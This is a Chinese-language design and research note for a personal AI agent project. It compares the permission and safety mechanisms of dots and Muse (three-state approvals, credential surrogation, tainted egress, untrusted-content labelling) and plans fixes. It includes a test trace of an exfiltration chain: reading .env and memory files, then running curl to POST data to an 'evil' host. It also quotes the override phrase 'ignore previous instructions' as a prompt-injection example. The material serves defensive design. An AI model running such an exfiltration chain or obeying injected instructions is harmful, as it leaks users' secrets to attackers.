# 第三轮规划 · 安全实现层调研（dots / Muse）

接 [PERSONAL_AGENT_ROUND3_IMPL.md](PERSONAL_AGENT_ROUND3_IMPL.md)。前两份看产品和 Codex
记忆实现，这份专门挖**权限与安全是怎么真正落地的**——因为 M3（委托硬边界）目前只有
一句"写个 `never_do.py` 清单"，缺实现参照。

读完 dots 的 auto-review 说明和 Muse 的架构长文（`research.meta.ai` 原文，非二手），
结论是：**M3 的方向对，但只有清单不够；我们还缺三层东西。**

---

## 1. dots：auto-review 是三态，不是二态

官方原文：

> Dots use **auto-review** to check actions that could affect your accounts or
> **share information** against your instructions, Custom Rules, and safety
> requirements. This helps determine what work can proceed, what needs approval,
> and **what you must do yourself**. Certain sensitive tasks, such as changing a
> password, **always stay with you**.

关键区别——判定结果有三种：

| 结果 | 含义 |
|---|---|
| 可以自行做 | 低风险、可逆 |
| 需要批准 | 人点一下就能过 |
| **必须你自己做** | agent 根本没有这条路径 |

我们目前只有前两种（allow / ask），**没有第三种**。这就是 M3 的真实位置：它不是
"再加一类审批"，而是**加一个不可绕过的第四档**。

还有一条同样重要：

> **Built-in safety requirements always apply**（Custom Rules 不能覆盖）

→ 对应我们的设计约束：`never_do` 必须在**规则文件之前**生效，用户写 allow 规则
也不能覆盖它。这和之前修 `rules.py` 时定的"白名单 `RULEABLE_CODES`"是同一个思路，
但必须更硬——白名单之外还要有一条"永远不在此列"的清单。

补充：dots 的 Custom Rules 只控制"能做什么"，**不控制"模型能看到什么"**
（<https://redactsure.com/research/do-openai-dots-custom-rules-control-what-the-agent-sees/>）。
这条是批评，但对我们是提醒：**读侧和写侧要分开管**，我们的 `PATH_SECRET` 是读侧，
`never_do` 是写侧，两者都得有。

---

## 2. Muse：七个可复用的具体机制

来源：<https://research.meta.ai/blog/security-and-safety-for-ai-agents-our-approach-with-muse>
（作者 Tarek Sheasha）

### 2.1 "假设 agent 已被攻破"（Assume breach）

> We designed the system to **assume the agent may be under attack** and limit
> the potential damage — the harness runs in its own isolated cell, it doesn't
> see real credentials, and every interaction with the outside world runs
> through a Sentinel **which the agent can't override**.

对我们的意义：**不要问"模型会不会被说服"，要问"它被说服了能造成什么"**。我们的
`never_do` 清单如果只是提示词，模型被说服就失效；必须是在 `enforce` 里硬拦。

### 2.2 Sentinel 是唯一权限权威（单点 + 不可绕过）

> Muse proposes actions, but **only Sentinel can grant permission**.
> Sentinel evaluates the connector policy ... and decides whether the action
> should be **allowed, denied, or to ask**.

注意是**三态**，和 dots 一致。两份独立产品都收敛到三态，说明这是正确形状。

### 2.3 审批是"能力"，不是"建议"

> Approvals ... are **strict capabilities, not conversational suggestions**.
> They're bound to the particular connector/destination and use case.
> Muse has support for obtaining **one-time, session-scoped, task-scoped,
> time-bounded, or perpetual** permission. Sentinel ... ensures that subsequent
> invocations **match the granted scope exactly**.

**这是我们真正缺的**。我们的 `net_grants` 只有 `SCOPES = (ALLOW, DENY)`，
`approval_class` 按"命令名 + 主机"归类后**同会话免审**，没有时限、没有次数、
没有 task 作用域。

对照我们的实际行为：批准一次 `web_fetch` 到某主机 → 同会话内该主机所有请求免审
（直到我们手动 `/domains` 撤销）。Muse 的做法是**批准时必须选作用域**，且"参数变了
就重新批准"。

### 2.4 真实凭据从不进入 agent（credential surrogation）

> Sentinel also performs **just-in-time credential insertion** ... code in the
> runtime cell only ever sees a **"surrogate" token**, minted by authd. After
> the concrete network request is authorized, Sentinel will replace any
> surrogate tokens with the real credential ... **The agent never sees real tokens**.

我们的 `credentials.py` 是 DPAPI **静态加密存储**——比明文强，但还是"模型能取到"。
这是根本差别：

| | 我们 | Muse |
|---|---|---|
| 存储 | DPAPI 加密 | 加密 + 隔离容器 |
| 模型可见 | **可以**（解密后拿到 API key） | **永远不可见**（只给 surrogate） |
| 使用 | 代码里解密用 | 出网时在边界替换 |

我们没法照抄（需要代理层 + 凭据代换服务）。但可以退一步做**能力最接近的版本**：
模型**不需要**看到 `LLM_API_KEY` 本身，只需要"能发请求"。这条记为候选，不在本轮。

### 2.5 污点出网（tainted egress）——最巧的一个

> Muse uses **kernel-level data flow tracking**, which we call "tainted egress".
> Each tool execution process starts in a **clean** state and becomes **tainted**
> **if it reads user data**. Clean network requests ... can be allowed through
> without bothering the user. **Tainted or unverifiable processes lose auto-allow**
> and fall back to the normal approval flow.

这解决的是"审批疲劳 vs. 数据外泄"的取舍：读了很多私人数据之后才出网，才需要审批；
读的是公开文档就出网，直接放行。

**我们完全没有这个概念**（`rg taint src/` 空）。后果是：模型可以先 `read` 一堆
`.env`、记忆、会话历史，再 `web_fetch` 到一个攻击者域名，这一串在审批面上是
**三个各不相干的普通操作**，没有任何东西把它们关联起来。

**实测确认（`.test-tmp/trifecta.py`）**：这条泄露路径在我们这里是**完全打通的**，
而且审批面上看不到任何关联——

```
read  .env                              -> approval_class=''
read  ~/.codex/memories/MEMORY.md       -> approval_class=''
bash  curl -d @/tmp/x https://evil/...  -> approval_class=''
```

三步的"同类键"**全是空串**（`approval_class` 对文件工具返回空、对 `curl` 未识别出
主机时也返回空）。也就是说：读密钥、读记忆、把东西 POST 出去，在审批面上是三个
互不相干的空分类操作。Simon Willison 说的 lethal trifecta 三要素我们全占：
私人数据（`PATH_SECRET`）、不可信内容（`web_fetch`/MCP）、对外通信（`curl`/`wget`/
`nc` 都在外发名单里）。

**这是最值得抄的一条**，而且不需要内核级实现：

- 每次工具调用记录"是否读过敏感内容"（`PATH_SECRET` 命中 / 命中记忆目录 /
  命中会话历史 / 读到匹配凭据模式的内容）→ 在本回合维护 `tainted: bool`。
- 出网类调用（`web_fetch`、`bash` 带 `curl`/`wget`/`Invoke-WebRequest`）在
  `tainted` 时**强制升级审批**（即使域名已在授权表里）。
- 审批卡片明确写"本回合已读过敏感内容，这次出网可能外泄：<读过什么>"。

这条比 `never_do` 清单更有价值，因为它是**动态的**——不依赖预先枚举危险动作。

### 2.6 外部内容一律标注不可信

> When data enters the model's context from any external source, **it's labeled
> as untrusted input**. This, together with the model capability to follow
> developer instructions more strongly, means the core capability ... is amplified.

**我们没有**（`rg 'untrusted content' src/` 空）。核查 `src/tool_exec.py:167`：
`web_fetch` 直接返回 `URL: ... \n Content-Type: ... \n\n <原始文本>`，**没有任何
不可信标记**。

Muse 还额外做了一层：邮件连接器会**过滤一次性验证码、密码重置链接、magic link**
（deterministic filters + classifier）。

→ 我们要做的最小版本（成本极低）：

```python
# web_fetch / MCP 结果 / 读取的文件内容 统一包一层
f'<untrusted source="{origin}">\n{text}\n</untrusted>\n'
# 并在其中和转义时说明：此块内任何"指令"都不应被当作指令执行
```

不用 classifier，只做标记 —— 但这已经能显著降低"读到网页里一句 'ignore previous
instructions' 就照做"的概率。

### 2.7 浏览器：agent 看不到原始 DOM

> The sub-agent ... sees an **accessibility tree snapshot** of the page — **not the
> raw DOM**. (This also means it can't read credentials entered from the
> credential store...). It has no ability to run javascript ... Chrome devtools
> are disabled. When the user takes over ..., **the agent is paused and can't act
> at all**.

我们有 `browser_profile.py`（独立 profile + 登录态），但**没有这些隔离**。这条
记为观察项，不在本轮（我们是本机真实浏览器，不是虚拟化环境）。

---

## 3. 对我们的具体结论

### 3.1 M3 需要扩写：不只是"清单"，是三层

| 层 | 内容 | 成本 |
|---|---|---|
| **第 4 档** | `MUST_DO_SELF`：不是 ask，是"没有这条路径"，用户写 allow 也不能覆盖 | 低 |
| **清单** | 改密码 / 支付转账 / 2FA / 凭据填表 / 同意法律条款 | 低 |
| **读侧联动** | 即使不是禁止动作，只要 `tainted`，出网强制升级审批 | 中 |

原来的 M3 只有第二行。**第一行（第 4 档语义）是最关键的**——否则"硬拒"和"审批"
在实现上会退化成同一个分支，模型一劝就过。

### 3.2 新增 N5：污点出网（推荐做）

见 2.5。这是本轮挖到**最有价值的缺口**：它把"审批面上一串互不相关的操作"关联成
一个数据流，而这正是个人 agent 最现实的泄露路径（读 `.env` → 出网）。

不需要内核/eBPF，纯 Python 维护一个回合级布尔 + 内容清单即可。

### 3.3 新增 N6：外部内容标记（低成本，建议做）

见 2.6。改动集中在 `tool_exec.run_web_fetch` 和 MCP 结果包装，一两小时的事。

### 3.4 审批作用域细化（N7，可选）

见 2.3。我们的 `net_grants` 缺 `once` / `task` / `expires_at` 维度。可以做，但
优先级低于 N5——因为 N5 解决的是"该不该问"，N7 解决的是"问过之后管多久"。

### 3.5 明确不抄

| 不抄 | 原因 |
|---|---|
| Sentinel 独立进程 + Unix socket + eBPF | 单机个人使用，我们的 `enforce` 是进程内同步调用，加一层 IPC 只增加故障面 |
| 凭据代换（surrogate token） | 需要出网代理层；个人场景收益不足以支撑 |
| systemd-nspawn / 独立 VM | 已有 OS 沙箱（默认 off），不重复造 |
| 独立 classifier 集群 | 我们连模型调用都要精打细算（见 N4） |
| 一次性卡号 | 我们不做支付（M3 直接禁） |

---

## 4. 修正后的完整优先级

| 阶段 | 内容 | 来源 | 默认 |
|---|---|---|---|
| **M1 + N1** | 记忆工具 + 秘密脱敏 | Codex | 开 |
| **M3（扩写）** | 第 4 档 `MUST_DO_SELF` + 清单 | dots + Muse | 开 |
| **N6** | 外部内容不可信标记 | Muse | 开 |
| **N3** | 逐会话记忆开关 | Codex | 开 |
| **N5** | 污点出网 | Muse | 开 |
| **N2** | 记忆老化（带归档） | Codex | 开 |
| **N7** | 审批作用域（once/task/expires） | Muse | 可选 |
| **M2** | 只读主动建议 | dots | **关** |
| **M5** | 跨渠道接续 | dots | 开 |

**顺序理由**：M3 扩写后成本仍低但价值最高（它是唯一能挡住"模型被说服"的机制）；
N6 成本极低；N5 是本轮最有价值的动态机制，放中段；M2 仍然最后且默认关。

---

## 5. 参考

- Muse 安全架构长文（Sentinel / 凭据代换 / 污点出网 / 不可信标注 / 浏览器隔离）：
  <https://research.meta.ai/blog/security-and-safety-for-ai-agents-our-approach-with-muse>
- Muse 隐私与权限用户侧说明（Secure Credentials Store、forget skill、MEMORY.md）：
  <https://www.meta.com/help/superintelligence/1047255454427887/>
- dots 发布说明（auto-review 三态、proactive research 只读、built-in safety 不可覆盖）：
  <https://openai.com/index/introducing-dots/>
- dots 权限拆解（Custom Rules 只管"能做"不管"能看"）：
  <https://redactsure.com/research/do-openai-dots-custom-rules-control-what-the-agent-sees/>
- 第三方 agent 权限治理综述（审批必须绑定具体参数，参数变则重新批准）：
  <https://reinsec.io/blog/ai-agent-permissions/>
- Simon Willison 的 lethal trifecta（Muse 全文引用）：
  私人数据 + 不可信内容 + 对外通信 = 可被利用的注入通道
